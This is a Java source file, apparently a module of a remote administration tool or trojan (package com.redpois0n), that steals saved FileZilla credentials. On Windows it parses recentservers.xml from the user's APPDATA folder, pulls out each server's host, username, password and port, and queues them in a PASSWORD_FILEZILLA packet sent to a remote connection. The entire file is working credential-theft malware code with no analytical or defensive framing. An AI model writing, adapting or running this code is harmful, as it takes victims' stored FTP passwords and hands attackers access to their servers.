package com.redpois0n.packets;

import java.io.File;

import javax.xml.parsers.DocumentBuilder;
import javax.xml.parsers.DocumentBuilderFactory;

import org.w3c.dom.Document;
import org.w3c.dom.Element;
import org.w3c.dom.Node;
import org.w3c.dom.NodeList;

import com.redpois0n.Connection;
import com.redpois0n.Util;
import com.redpois0n.common.os.OperatingSystem;


public class PacketFZ extends Packet {

	@Override
	public void read(String line) throws Exception {
		File file = null;
		if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
			file = new File(System.getenv("APPDATA") + "\\FileZilla\\recentservers.xml");
			
			if (file.exists()) {
				DocumentBuilderFactory dbFactory = DocumentBuilderFactory.newInstance();
				DocumentBuilder dBuilder = dbFactory.newDocumentBuilder();
				Document doc = dBuilder.parse(file);
				doc.getDocumentElement().normalize();

				NodeList nList = doc.getElementsByTagName("Server");
				for (int temp = 0; temp < nList.getLength(); temp++) {
					Node nNode = nList.item(temp);
					if (nNode.getNodeType() == Node.ELEMENT_NODE) {
						Element eElement = (Element) nNode;
						
						PacketBuilder packet = new PacketBuilder(Header.PASSWORD_FILEZILLA);
						packet.add(Util.getTagValue("Host", eElement));
						packet.add(Util.getTagValue("User", eElement));
						packet.add(Util.getTagValue("Pass", eElement));
						packet.add(Util.getTagValue("Port", eElement));
						Connection.addToSendQueue(packet);
					}
				}
			}
		}		
		
	}

}
